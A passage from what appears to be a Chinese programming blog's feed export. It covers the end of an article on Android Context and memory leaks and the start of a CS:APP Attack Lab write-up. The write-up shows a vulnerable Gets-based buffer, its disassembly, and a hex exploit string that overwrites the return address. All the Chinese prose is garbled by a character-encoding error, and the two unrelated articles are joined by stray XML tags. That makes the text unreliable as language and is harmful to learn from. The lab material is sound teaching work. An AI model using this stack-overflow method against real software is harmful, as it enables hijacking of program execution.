ä¸ºè¿™äº›æ“ä½œä¸Žç³»ç»Ÿæ˜¯ç´§å¯†ç›¸å…³çš„ï¼Œæˆ‘ä»¬çŸ¥é“å¯åŠ¨è¿™äº›ä¸œè¥¿éƒ½éœ€è¦ä½¿ç”¨ä¸€ä¸ªå«intentçš„ä¸œè¥¿ï¼ˆå…³äºŽintentçš„å†…å®¹ä¼šåœ¨å¦å¤–çš„æ–‡ç« è®²ï¼‰ï¼Œä»¥startActivity()æ–¹æ³•ä¸ºä¾‹ï¼Œæˆ‘ä»¬ä¸€è·¯å‘ä¸Šè¿½æº¯ï¼Œå¯ä»¥å‘çŽ°å¯åŠ¨activityæœ€ç»ˆæ˜¯ç”±AcitivityManagerNative.getDefault()çš„æœ¬åœ°æ–¹æ³•startActivity()æ‰§è¡Œçš„ï¼š 12345678910try &#123; intent.migrateExtraStreamToClipData(); intent.prepareToLeaveProcess(); int result = ActivityManagerNative.getDefault().startActivity( whoThread, who.getBasePackageName(), intent, intent.resolveTypeIfNeeded(who.getContentResolver()), token, target != null ? target.mEmbeddedID : null, requestCode, 0, null, options); checkStartActivityResult(result, intent);&#125; catch (RemoteException e) &#123;&#125; è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å‘çŽ°ï¼Œä¼ å…¥çš„contextå·²ç»å˜æˆäº†ä¸Šé¢ä»£ç ä¸­çš„whoï¼Œåˆ©ç”¨è¿™ä¸ª contextèŽ·å–äº†åŒ…åä¸Žæ–¹æ³•çš„ç¬¬å››ä¸ªå‚æ•°who.getContentResolver()ã€‚å®ƒçš„ä½œç”¨æ˜¯æä¾›ä¿¡æ¯æ¥è§£æžintentçš„MIME typeï¼Œå¸®åŠ©ç³»ç»Ÿå†³å®šintentçš„ç›®æ ‡ã€‚ å¯ä»¥çœ‹åˆ°contextåœ¨è¿™é‡ŒåŒæ ·èµ·åˆ°äº†ä¸€ä¸ªæä¾›å¿…è¦ä¿¡æ¯çš„ä½œç”¨ã€‚ Contextçš„ä½œç”¨åœ¨è¿™é‡Œå†é‡å¤ä¸€éä¸Šé¢è¯´è¿‡çš„è¯ï¼Œé…åˆä¹‹å‰çš„ä¾‹å­ï¼Œæ˜¯ä¸æ˜¯å¯ä»¥æ›´å¥½åœ°ç†è§£äº†å‘¢ï¼Ÿ æˆ‘ä»¬å¯ä»¥æŠŠå®ƒçœ‹ä½œæ˜¯ä¸€ä¸ªè¿žæŽ¥æˆ‘ä»¬ä»£ç ä¸Žå®‰å“ç³»ç»Ÿçš„â€œæ¡¥æ¢â€ï¼Œæˆ‘ä»¬å¼€å‘çš„åº”ç”¨æ˜¯ä¸Žè¿è¡Œåœ¨è®¾å¤‡ä¸Šçš„æ“ä½œç³»ç»Ÿç´§å¯†ç›¸å…³çš„ï¼Œåªèƒ½é€šè¿‡æ“ä½œç³»ç»Ÿï¼Œæˆ‘ä»¬æ‰èƒ½åŽ»å¯åŠ¨ä¸€ä¸ªæ–°çš„Activityï¼Œå‘å…¶ä»–åº”ç”¨å‘é€å¹¿æ’­ï¼Œå¯åŠ¨ä¸€ä¸ªæ–°çš„Serviceæˆ–æ˜¯è®¿é—®æˆ‘ä»¬å­˜æ”¾åœ¨apkä¸­çš„èµ„æºæ–‡ä»¶ã€‚ Contextå°±æ˜¯ç³»ç»Ÿä¸ºæˆ‘ä»¬æä¾›ä¸Šè¿°åŠŸèƒ½çš„ä¸€ä¸ªæŽ¥å£ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨å®ƒåŽ»å®Œæˆä¸Žç³»ç»Ÿçš„ä¿¡æ¯äº¤æ¢ã€‚ Contextçš„ä½¿ç”¨Contextåˆ†ç±»Contextå¹¶ä¸æ˜¯éƒ½æ˜¯ç›¸åŒçš„ï¼Œæ ¹æ®èŽ·å–æ–¹å¼çš„ä¸åŒï¼Œæˆ‘ä»¬å¾—åˆ°çš„Contextçš„å„ç±»ä¹Ÿæœ‰æ‰€ä¸åŒã€‚ Activity/Serviceæˆ‘ä»¬çŸ¥é“Acitivityç±»ç»§æ‰¿è‡ªContextThemeWrapperï¼ŒContextThemeWrapperç»§æ‰¿è‡ªContextWrapperï¼Œæœ€åŽContextWrapperç»§æ‰¿è‡ªContextã€‚é¡¾åæ€ä¹‰ï¼ŒContextWrapperä¸ŽContextThemeWrapperåªæ˜¯å°†Contextè¿›è¡Œäº†å†æ¬¡çš„åŒ…è£…ï¼ŒåŠ å…¥äº†æ›´å¤šçš„ä¿¡æ¯ï¼ŒåŒæ—¶å¯¹ä¸€äº›æ–¹æ³•åšäº†è½¬å‘ã€‚ æ‰€ä»¥æˆ‘ä»¬åœ¨Activityæˆ–Serviceä¸­éœ€è¦Contextæ—¶å°±å¯ä»¥ç›´æŽ¥ä½¿ç”¨thisï¼Œå› ä¸ºå®ƒä»¬æœ¬èº«å°±æ˜¯Contextã€‚ å½“ç³»ç»Ÿåˆ›å»ºä¸€ä¸ªæ–°çš„Activity/Serviceå®žä¾‹æ—¶ï¼Œå®ƒä¹Ÿä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ContextImplå®žä¾‹æ¥å°è£…æ‰€æœ‰çš„ä¿¡æ¯ã€‚ å¯¹äºŽæ¯ä¸€ä¸ªActivity/Serviceå®žä¾‹ï¼Œå®ƒä»¬çš„åŸºç¡€Contextéƒ½æ˜¯ç‹¬ç«‹çš„ã€‚ ApplicationApplicationåŒæ ·ç»§æ‰¿äºŽContextWrapperï¼Œä½†æ˜¯Applicationæœ¬èº«æ˜¯ä»¥å•ä¾‹æ¨¡å¼è¿è¡Œåœ¨åº”ç”¨è¿›ç¨‹ä¸­çš„ï¼Œå®ƒå¯ä»¥è¢«ä»»ä½•Activity/Serviceç”¨getApplication()æˆ–æ˜¯è¢«ä»»ä½•Contextä½¿ç”¨getApplicationContext()æ–¹æ³•èŽ·å–ã€‚ ä¸ç®¡ä½¿ç”¨ä»€ä¹ˆæ–¹æ³•åŽ»èŽ·å–Applicationï¼ŒèŽ·å–çš„æ€»æ˜¯åŒä¸€ä¸ªApplicationå®žä¾‹ã€‚ BroadcastReciverBroadcastReciveræœ¬èº«å¹¶ä¸æ˜¯ä¸€ä¸ªContextæˆ–åœ¨å†…éƒ¨ä¿å­˜äº†ä¸€ä¸ªContextï¼Œä½†æ˜¯ç³»ç»Ÿä¼šåœ¨æ¯æ¬¡è°ƒç”¨å…¶onRecive()æ–¹æ³•æ—¶å‘å®ƒä¼ é€’ä¸€ä¸ªContextå¯¹è±¡ï¼Œè¿™ä¸ªContextå¯¹è±¡æ˜¯ä¸€ä¸ªReceiverRestrictedContextï¼ˆæŽ¥æ”¶å™¨é™å®šContextï¼‰ï¼Œä¸Žæ™®é€šContextä¸åŒåœ¨å®ƒçš„registerReceiver()ä¸ŽbindSerivce()æ–¹æ³•æ˜¯è¢«ç¦æ­¢ä½¿ç”¨çš„ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬ä¸èƒ½åœ¨onRecive()æ–¹æ³•ä¸­è°ƒç”¨è¯¥Contextçš„è¿™ä¸¤ä¸ªæ–¹æ³•ã€‚ æ¯æ¬¡è°ƒç”¨onReceive()æ–¹æ³•ä¼ é€’çš„Contextéƒ½æ˜¯å…¨æ–°çš„ã€‚ ContentProviderå®ƒæœ¬èº«åŒæ ·ä¸æ˜¯ä¸€ä¸ªContextï¼Œä½†å®ƒåœ¨åˆ›å»ºæ—¶ä¼šè¢«èµ‹äºˆä¸€ä¸ªContextå¹¶å¯ä»¥é€šè¿‡getContext()æ–¹æ³•èŽ·å–ã€‚ å¦‚æžœè¿™ä¸ªå†…å®¹æä¾›å™¨è¿è¡Œåœ¨è°ƒç”¨å®ƒçš„åº”ç”¨ä¸­ï¼Œå°†ä¼šè¿”å›žè¯¥åº”ç”¨çš„Applicationå•ä¾‹ï¼Œå¦‚æžœå®ƒæ˜¯ç”±å…¶ä»–åº”ç”¨æä¾›çš„ï¼Œè¿”å›žçš„Contextå°†ä¼šæ˜¯ä¸€ä¸ªæ–°åˆ›å»ºçš„è¡¨ç¤ºå…¶ä»–åº”ç”¨çŽ¯å¢ƒçš„Contextã€‚ ä½¿ç”¨Contextæ—¶çš„é™·é˜±çŽ°åœ¨æˆ‘ä»¬çŸ¥é“Contextçš„å‡ ç§åˆ†ç±»ï¼Œå…¶å®žä¸Šé¢çš„åˆ†ç±»ä¹Ÿå°±æ˜¯æˆ‘ä»¬èŽ·å–å®ƒçš„æ–¹å¼ã€‚ç€é‡æ ‡å‡ºçš„å†…å®¹è¯´æ˜Žäº†å®ƒä»¬è¢«æä¾›çš„æ¥æºï¼Œä¹Ÿæš—æŒ‡äº†å®ƒä»¬çš„ç”Ÿå‘½å‘¨æœŸã€‚ æˆ‘ä»¬å¸¸å¸¸ä¼šåœ¨ç±»ä¸­ä¿å­˜å¯¹Contextçš„å¼•ç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬è¦è€ƒè™‘ç”Ÿå‘½å‘¨æœŸçš„é—®é¢˜ï¼šå¦‚æžœè¢«å¼•ç”¨çš„è¿™ä¸ªContextæ˜¯ä¸€ä¸ªAcitivityï¼Œå¦‚æžœå­˜æ”¾è¿™ä¸ªå¼•ç”¨çš„ç±»çš„ç”Ÿå‘½å‘¨æœŸå¤§äºŽActivityçš„ç”Ÿå‘½å‘¨æœŸï¼Œé‚£ä¹ˆActivityåœ¨åœæ­¢ä½¿ç”¨ä¹‹åŽè¿˜è¢«è¿™ä¸ªç±»å¼•ç”¨ç€ï¼Œå°±ä¼šå¼•è‡´æ— æ³•è¢«GCï¼Œé€ æˆäº‹å®žä¸Šçš„å†…å­˜æ³„éœ²ã€‚ ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œå¦‚æžœä½¿ç”¨ä¸‹é¢çš„ä¸€ä¸ªå•ä¾‹æ¥ä¿å­˜Contextçš„å¼•ç”¨æ¥åŠ è½½èµ„æºï¼š 1234567891011121314151617public class CustomManager &#123; private static CustomManager sInstance; public static CustomManager getInstance(Context context) &#123; if (sInstance == null) &#123; sInstance = new CustomManager(context); &#125; return sInstance; &#125; private Context mContext; private CustomManager(Context context) &#123; mContext = context; &#125;&#125; è¿™æ®µç¨‹åºçš„é—®é¢˜åœ¨äºŽä¸çŸ¥é“ä¼ å…¥çš„Contextä¼šæ˜¯ä»€ä¹ˆç±»åž‹çš„ï¼Œå¯èƒ½åœ¨åˆå§‹åŒ–çš„æ—¶å€™ä¼ å…¥çš„æ˜¯ä¸€ä¸ªActivity/Serivceï¼Œé‚£ä¹ˆå‡ ä¹Žå¯ä»¥è‚¯å®šçš„æ˜¯ï¼Œè¿™ä¸ªActivity/Serviceå°†ä¸ä¼šåœ¨ç»“æŸä»¥åŽè¢«åžƒåœ¾å›žæ”¶ã€‚å¦‚æžœæ˜¯ä¸€ä¸ªActivityï¼Œé‚£ä¹ˆè¿™æ„å‘³ç€ä¸Žå®ƒç›¸å…³è”çš„Viewæˆ–æ˜¯å…¶ä»–åºžå¤§çš„ç±»éƒ½å°†ç•™åœ¨å†…å­˜ä¸­è€Œä¸ä¼šè¢«å›žæ”¶ã€‚ ä¸ºäº†é¿å…è¿™æ ·çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥æ”¹æ­£è¿™ä¸ªå•ä¾‹ï¼š 123456789101112131415161718public class CustomManager &#123; private static CustomManager sInstance; public static CustomManager getInstance(Context context) &#123; if (sInstance == null) &#123; //Always pass in the Application Context sInstance = new CustomManager(context.getApplicationContext()); &#125; return sInstance; &#125; private Context mContext; private CustomManager(Context context) &#123; mContext = context; &#125;&#125; æˆ‘ä»¬åªä¿®æ”¹äº†ä¸€å¤„ï¼Œç¬¬7è¡Œä¸­æˆ‘ä»¬ä½¿ç”¨context.getApplicationContext()è¿™ä¸ªæ–¹æ³•æ¥èŽ·å–Applicationè¿™ä¸ªå•ä¾‹ï¼Œè€Œä¸æ˜¯ç›´æŽ¥ä¿å­˜contextæœ¬èº«ï¼Œè¿™æ ·å°±å¯ä»¥ä¿è¯ä¸ä¼šå‡ºçŽ°æŸcontextå› ä¸ºè¢«è¿™ä¸ªå•ä¾‹å¼•ç”¨è€Œä¸èƒ½å›žæ”¶çš„æƒ…å†µã€‚è€ŒApplicationæœ¬èº«æ˜¯å•ä¾‹è¿™ä¸ªç‰¹æ€§ä¿è¯äº†ç”Ÿå‘½å‘¨æœŸçš„ä¸€è‡´ï¼Œä¸ä¼šé€ æˆå†…å­˜çš„æµªè´¹ã€‚ ä¸ºä»€ä¹ˆä¸æ€»æ˜¯ä½¿ç”¨applicationä½œä¸ºcontextæ—¢ç„¶å®ƒæ˜¯ä¸€ä¸ªå•ä¾‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸ºä»€ä¹ˆä¸ç›´æŽ¥åœ¨ä»»ä½•åœ°æ–¹éƒ½åªä½¿ç”¨å®ƒå‘¢ï¼Ÿ è¿™æ˜¯å› ä¸ºå„ç§contextçš„èƒ½åŠ›æœ‰æ‰€ä¸åŒï¼š ï¼ˆå›¾ç‰‡å‡ºå¤„è§æ–‡æœ«ï¼‰ å¯¹å‡ ä¸ªæ³¨è§£çš„åœ°æ–¹ä½œè¯´æ˜Žï¼š ä¸€ä¸ªapplicationå¯ä»¥å¯åŠ¨ä¸€ä¸ªactivityï¼Œä½†æ˜¯éœ€è¦æ–°å»ºä¸€ä¸ªtaskï¼Œåœ¨ç‰¹æ®Šæƒ…å†µä¸‹å¯ä»¥è¿™ä¹ˆåšï¼Œä½†æ˜¯è¿™ä¸æ˜¯ä¸€ä¸ªå¥½çš„è¡Œä¸ºå› ä¸ºè¿™ä¼šå¯¼è‡´ä¸€ä¸ªä¸å¯»å¸¸çš„è¿”å›žæ ˆã€‚ è™½ç„¶è¿™æ˜¯åˆæ³•çš„ï¼Œä½†æ˜¯ä¼šå¯¼è‡´å¡«å……å‡ºæ¥çš„viewä½¿ç”¨ç³»ç»Ÿé»˜è®¤çš„ä¸»é¢˜è€Œä¸æ˜¯æˆ‘ä»¬è®¾ç½®çš„ä¸»é¢˜ã€‚ å¦‚æžœæŽ¥æ”¶å™¨æ˜¯nullçš„è¯æ˜¯è¢«å…è®¸çš„ï¼Œé€šå¸¸åœ¨4.2åŠä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ç”¨æ¥èŽ·å–ä¸€ä¸ªç²˜æ€§å¹¿æ’­çš„å½“å‰å€¼ã€‚ æˆ‘ä»¬å¯ä»¥å‘çŽ°ä¸ŽUIæœ‰å…³çš„æ“ä½œé™¤activityä¹‹å¤–éƒ½ä¸èƒ½å®Œæˆï¼Œåœ¨å…¶ä»–åœ°æ–¹è¿™äº›contextèƒ½åšçš„äº‹æƒ…éƒ½å·®ä¸å¤šã€‚ ä½†æ˜¯æˆ‘ä»¬å›žè¿‡å¤´æ¥æƒ³ï¼Œè¿™ä¸‰ä¸ªä¸ŽUIç›¸å…³çš„æ“ä½œä¸€èˆ¬éƒ½ä¸ä¼šåœ¨ä¸€ä¸ªactivityä¹‹å¤–è¿›è¡Œï¼Œè¿™ä¸ªç‰¹æ€§å¾ˆå¤§ç¨‹åº¦ä¸Šå°±æ˜¯ç³»ç»Ÿä¸ºæˆ‘ä»¬è®¾è®¡æˆè¿™æ ·çš„ï¼Œå¦‚æžœæˆ‘ä»¬è¯•å›¾åŽ»ç”¨ä¸€ä¸ªApplicationåŽ»æ˜¾ç¤ºä¸€ä¸ªdialogå°±ä¼šå¯¼è‡´å¼‚å¸¸çš„æŠ›å‡ºå’Œåº”ç”¨çš„å´©æºƒã€‚ å¯¹ä¸Šé¢çš„ç¬¬äºŒç‚¹å†è¿›ä¸€æ­¥è§£é‡Šï¼Œè™½ç„¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨applicationä½œä¸ºcontextåŽ»å¡«å……ä¸€ä¸ªviewï¼Œä½†æ˜¯è¿™æ ·å¡«å……å‡ºçš„viewä½¿ç”¨çš„å°†ä¼šæ˜¯ç³»ç»Ÿé»˜è®¤çš„ä¸»é¢˜ï¼Œè¿™æ˜¯å› ä¸ºåªæœ‰acitivityä¸­æ‰ä¼šå­˜æœ‰æˆ‘ä»¬å®šä¹‰åœ¨manifestä¸­çš„ä¸»é¢˜ä¿¡æ¯ï¼Œå…¶ä»–çš„contextå°†ä¼šä½¿ç”¨é»˜è®¤çš„ä¸»é¢˜åŽ»å¡«å……viewã€‚ å¦‚ä½•ä½¿ç”¨æ­£ç¡®çš„Contextæ—¢ç„¶æˆ‘ä»¬ä¸èƒ½å°†Activityä½œä¸ºcontextä¿å­˜åœ¨å¦å¤–ä¸€ä¸ªæ¯”è¯¥Activityç”Ÿå‘½å‘¨æœŸé•¿çš„ç±»ä¸­ï¼Œé‚£ä¹ˆå¦‚æžœæˆ‘ä»¬éœ€è¦åœ¨è¿™ä¸ªç±»ä¸­å®Œæˆä¸ŽUIæœ‰å…³çš„æ“ä½œï¼ˆæ¯”å¦‚æ˜¾ç¤ºä¸€ä¸ªdialogï¼‰è¯¥æ€Žä¹ˆåŠžï¼Ÿ å¦‚æžœçœŸçš„é‡åˆ°äº†è¿™æ ·çš„æƒ…å†µï¼šæˆ‘ä»¬ä¸å¾—ä¸ä¿å­˜ä¸€ä¸ªactivityåœ¨ä¸€ä¸ªæ¯”è¯¥Activityç”Ÿå‘½å‘¨æœŸé•¿çš„ç±»ä¸­ä»¥è¿›è¡ŒUIæ“ä½œï¼Œå°±è¯´æ˜Žæˆ‘ä»¬çš„è®¾è®¡æ˜¯æœ‰é—®é¢˜çš„ï¼Œç³»ç»Ÿçš„è®¾è®¡å†³å®šäº†æˆ‘ä»¬ä¸åº”è¯¥åŽ»è¿›è¡Œè¿™æ ·çš„æ“ä½œã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¾—å‡ºç»“è®ºï¼š æˆ‘ä»¬åº”è¯¥åœ¨Activity/Serviceçš„ç”Ÿå‘½å‘¨æœŸèŒƒå›´å†…ç›´æŽ¥ä½¿ç”¨è¯¥Activity/Serviceä½œä¸ºcontextï¼Œåœ¨å®ƒä»¬çš„èŒƒå›´ä¹‹å¤–çš„ç±»ï¼Œåº”è¯¥ä½¿ç”¨Applicationå•ä¾‹è¿™ä¸ªcontextï¼ˆå¹¶ä¸”ä¸åº”è¯¥å‡ºçŽ°UIæ“ä½œï¼‰ã€‚ Referencehttps://possiblemobile.com/2013/06/context/ https://web.archive.org/web/20170621005334/http://levinotik.tumblr.com/post/15783237959/demystifying-context-in-android http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/5.1.1_r1/android/app/ContextImpl.java?av=f]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿï¼ˆCS:APP) - Attack Labè¯¦è§£]]></title>
    <url>%2F2017%2F07%2F18%2FCS_APP_AttackLab%2F</url>
    <content type="text"><![CDATA[Attack Labå®žéªŒä»£ç è§GitHub ç®€ä»‹Attack Labçš„å†…å®¹é’ˆå¯¹çš„æ˜¯CS-APPä¸­ç¬¬ä¸‰ç« ä¸­å…³äºŽç¨‹åºå®‰å…¨æ€§æè¿°ä¸­çš„æ ˆæº¢å‡ºæ”»å‡»ã€‚åœ¨è¿™ä¸ªLabä¸­ï¼Œæˆ‘ä»¬éœ€è¦é’ˆå¯¹ä¸åŒçš„ç›®çš„ç¼–å†™æ”»å‡»å­—ç¬¦ä¸²æ¥å¡«å……ä¸€ä¸ªæœ‰æ¼æ´žçš„ç¨‹åºçš„æ ˆæ¥è¾¾åˆ°æ‰§è¡Œæ”»å‡»ä»£ç çš„ç›®çš„ï¼Œæ”»å‡»æ–¹å¼åˆ†ä¸ºä»£ç æ³¨å…¥æ”»å‡»ä¸Žè¿”å›žå¯¼å‘ç¼–ç¨‹æ”»å‡»ã€‚æœ¬å®žéªŒä¹Ÿæ˜¯å¯¹æ—§ç‰ˆæœ¬ä¸­IA32ç¼–å†™çš„Buffer Labçš„æ›¿ä»£ã€‚ æˆ‘ä»¬å¯ä»¥ä»ŽCMUçš„labä¸»é¡µæ¥èŽ·å–è‡ªå­¦è€…ç‰ˆæœ¬ä¸Žå®žéªŒè®²ä¹‰(Writeup)ï¼Œè®²ä¹‰ä¸­åŒ…å«äº†å¿…è¦çš„æç¤ºã€å»ºè®®ä¸Žè¢«ç¦æ­¢çš„æ“ä½œï¼Œä»Žè¿™ä¸ªlabå¼€å§‹ä¹‹åŽçš„labå¯¹è®²ä¹‰ä¸­å†…å®¹çš„ä¾èµ–è¿˜æ˜¯å¾ˆå¼ºçš„ã€‚ ç‰¹åˆ«æç¤º æœ¬labçš„è‡ªå­¦è€…ç‰ˆæœ¬éœ€è¦åœ¨è¿è¡Œç¨‹åºæ—¶åŠ ä¸Š-qå‚æ•°æ¥é¿å…ç¨‹åºå‘ä¸å­˜åœ¨çš„è¯„åˆ†æœåŠ¡å™¨æäº¤æˆ‘ä»¬çš„ç­”æ¡ˆå¯¼è‡´æŠ¥é”™ å‰ç½®è®²ä¹‰ä¸­é¦–å…ˆç»™æˆ‘ä»¬å±•ç¤ºäº†å¯¼è‡´ç¨‹åºæ¼æ´žçš„å…³é”®ï¼šgetbufå‡½æ•°ã€‚ 123456unsigned getbuf()&#123; char buf[BUFFER_SIZE]; Gets(buf); return 1;&#125; getbufå‡½æ•°åœ¨æ ˆä¸­ç”³è¯·äº†ä¸€å—BUFFER_SIZEå¤§å°çš„ç©ºé—´ï¼Œç„¶åŽåˆ©ç”¨è¿™å—ç©ºé—´é¦–åœ°å€ä½œä¸ºGetså‡½æ•°çš„å‚æ•°æ¥ä»Žæ ‡å‡†è¾“å…¥æµä¸­è¯»å–å­—ç¬¦ã€‚ç”±äºŽæ²¡æœ‰å¯¹è¯»å…¥å­—ç¬¦æ•°é‡çš„æ£€æŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æä¾›ä¸€ä¸ªè¶…è¿‡BUFFER_SIZEçš„å­—ç¬¦ä¸²æ¥å‘getbufçš„æ ˆå¸§ä¹‹å¤–å†™å…¥æ•°æ®ã€‚ åœ¨ä»£ç æ³¨å…¥æ”»å‡»ä¸­å°±æ˜¯åˆ©ç”¨å‡½æ•°è¿”å›žæ—¶RETæŒ‡ä»¤ä¼šå°†è°ƒç”¨æ–¹åœ¨æ ˆä¸­å­˜æ”¾çš„è¿”å›žåœ°å€è¯»å…¥IPä¸­ï¼Œæ‰§è¡Œè¯¥åœ°å€æŒ‡å‘çš„ä»£ç ã€‚æ ˆæº¢å‡ºåŽï¼Œæˆ‘ä»¬å¯ä»¥æ”¹å†™è¿™ä¸ªè¿”å›žåœ°å€ï¼ŒæŒ‡å‘æˆ‘ä»¬åŒæ ·å­˜æ”¾åœ¨æ ˆä¸­çš„æŒ‡ä»¤ï¼Œä»¥è¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚ ç¬¬ä¸€éƒ¨åˆ†ï¼šä»£ç æ³¨å…¥æ”»å‡»Levelï¼‘åœ¨è¿™ä¸ªç­‰çº§ä¸­ï¼Œæˆ‘ä»¬ä¸éœ€è¦æ³¨å…¥ä»»ä½•æ”»å‡»ä»£ç ï¼Œåªéœ€è¦æ›´æ”¹getbufå‡½æ•°çš„è¿”å›žåœ°å€æ‰§è¡ŒæŒ‡å®šçš„å‡½æ•°touch1ï¼ˆè¯¥å‡½æ•°å·²ç»å­˜åœ¨äºŽç¨‹åºä¸­ï¼‰ã€‚ é‚£ä¹ˆæˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯å°†æ ˆä¸­å­˜æ”¾è¿”å›žåœ°å€çš„ä½ç½®æ”¹ä¸ºtouch1å‡½æ•°çš„å…¥å£åœ°å€ï¼Œé—®é¢˜åœ¨äºŽæˆ‘ä»¬å¦‚ä½•å°†åœ°å€ç²¾ç¡®åœ°å†™å…¥åˆ°åŽŸæ¥çš„åœ°å€çš„ä½ç½®ã€‚ è®²ä¹‰ç»™å‡ºäº†getbufçš„è°ƒç”¨å‡½æ•°ï¼š 123456void test()&#123; int val; val = getbuf(); printf("No exploit. Getbuf returned 0x%x\n", val);&#125; å¦‚æžœæ”»å‡»æˆåŠŸï¼Œæˆ‘ä»¬ä¸ä¼šæ‰§è¡Œåˆ°ç¬¬äº”è¡Œï¼Œè€Œæ˜¯è·³è½¬åˆ°touch1ä¸­æ‰§è¡Œï¼š 1234567void touch1()&#123; vlevel = 1; /* Part of validation protocol */ printf("Touch1!: You called touch1()\n"); validate(1); exit(0);&#125; è¾“å‡ºä¸Šé¢çš„å­—ç¬¦ä¸²ä»£è¡¨æˆ‘ä»¬æ”»å‡»æˆåŠŸã€‚ ä¸‹é¢æˆ‘ä»¬åˆ©ç”¨objdump -då‘½ä»¤å°†ç¨‹åºåæ±‡ç¼–æ¥æŸ¥çœ‹getbufå‡½æ•°çš„è¡Œä¸ºã€‚ 12345678900000000004017a8 &lt;getbuf&gt;: 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 &lt;Gets&gt; 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq 4017be: 90 nop 4017bf: 90 nop ä»£ç æ¯”è¾ƒç®€å•ï¼Œåœ¨ç¬¬2è¡Œä¸­å°†rspå‡äº†0x28ï¼Œç”³è¯·äº†ä¸€å—28å­—èŠ‚çš„ç©ºé—´ï¼Œç¬¬3è¡Œå°†rspèµ‹ç»™rdiå°±æ˜¯ç©ºé—´çš„é¦–åœ°å€ï¼Œç„¶åŽè°ƒç”¨äº†Getså‡½æ•°ï¼Œrdiå°±æ˜¯å®ƒçš„å‚æ•°ã€‚åˆ°è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç¡®å®šBUFFER_SIZEçš„å¤§å°ä¸º0x28ï¼ˆè‡ªå­¦è®²ä¹‰ä¸­è¿™ä¸ªå€¼æ˜¯å›ºå®šçš„ï¼Œä½†æ˜¯çœŸæ­£çš„å®žéªŒä¸­è¿™ä¸ªå€¼æ˜¯ç”±æœåŠ¡å™¨ç”Ÿæˆçš„ï¼‰ã€‚æ¢å¥è¯è¯´ï¼Œåœ¨0x28å­—èŠ‚çš„æ ˆè¢«Getså‡½æ•°å†™æ»¡ä¹‹åŽï¼Œå¤šå‡ºæ¥çš„å­—ç¬¦ä¼šè¢«å†™å…¥getbufå‡½æ•°çš„æ ˆå¤–ã€‚æˆ‘ä»¬ç”¨å›¾æ¥è¯´æ˜Žæ ˆçš„ç»“æž„ï¼š ä¸‹é¢æ˜¯ä½Žåœ°å€ï¼Œä¸Šé¢æ˜¯é«˜åœ°å€ï¼Œåœ¨getbufå‡½æ•°ç”³è¯·çš„0x28å­—èŠ‚å†…å­˜ä¹‹å¤–çš„8ä¸ªå­—èŠ‚å­˜æ”¾çš„å°±æ˜¯testå‡½æ•°callæŒ‡ä»¤åŽä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚ çŽ°åœ¨æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œæˆ‘ä»¬éœ€è¦ç”¨0x28å­—èŠ‚æ¥å°†æ ˆå¡«æ»¡ï¼Œå†å†™å…¥touch1å‡½æ•°çš„å…¥å£åœ°å€ï¼Œåœ¨getbufå‡½æ•°æ‰§è¡Œåˆ°retæŒ‡ä»¤çš„æ—¶å€™å°±ä¼šè¿”å›žåˆ°touch1ä¸­æ‰§è¡Œã€‚ ä¸‹é¢å°±è¦åˆ©ç”¨å®˜æ–¹æä¾›çš„hex2rawç¨‹åºæ¥å¸®åŠ©æˆ‘ä»¬ç”Ÿæˆæ”»å‡»å­—ç¬¦ä¸²ï¼Œè¿™ä¸ªç¨‹åºå°†ä»¥ç©ºç™½å­—ç¬¦éš”å¼€è¡¨ç¤ºçš„å­—èŠ‚è½¬æ¢æˆçœŸæ­£çš„äºŒè¿›åˆ¶å­—èŠ‚ï¼Œæ³¨æ„è¿™ä¸ªç¨‹åºåªæ˜¯åŽŸæ ·åœ°è½¬æ¢æ–‡ä»¶ä¸­çš„å­—ç¬¦ï¼Œæ‰€ä»¥å­—èŠ‚åºçš„é—®é¢˜æ˜¯æˆ‘ä»¬åº”è¯¥è€ƒè™‘çš„ã€‚ æœ€ç»ˆçš„ç­”æ¡ˆå¦‚ä¸‹ï¼š 12345600 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 å¯ä»¥çœ‹åˆ°å‰0x28ä¸ªå­—èŠ‚éƒ½ä½¿ç”¨0x00æ¥å¡«å……ï¼Œç„¶åŽåœ¨æº¢å‡ºçš„8ä¸ªå­—èŠ‚ä¸­å†™å…¥äº†touch1çš„é¦–åœ°å€0x4017c0ï¼Œæ³¨æ„å­—èŠ‚åºå°±å¯ä»¥äº†ã€‚ Level 2è¿™ä¸ªç­‰çº§ä¸­æˆ‘ä»¬åŒæ ·éœ€è¦è·³è½¬åˆ°æŒ‡å®šçš„å‡½æ•°touch2ä¸­ï¼Œä½†æ˜¯æƒ³è¦é€šè¿‡touch2éœ€è¦æˆ‘ä»¬è¿›è¡Œä¸€äº›æ“ä½œï¼Œè®²ä¹‰ä¸­ç»™å‡ºäº†touch2çš„ä»£ç ï¼š 1234567891011void touch2(unsigned val) &#123; vlevel = 2; /* Part of validation protocol */ if (val == cookie) &#123; printf("Touch2!: You called touch2(0x%.8x)\n", val); validate(2); &#125; else &#123; printf("Misfire: You called touch2(0x%.8x)\n", val); fail(2); &#125; exit(0);&#125; 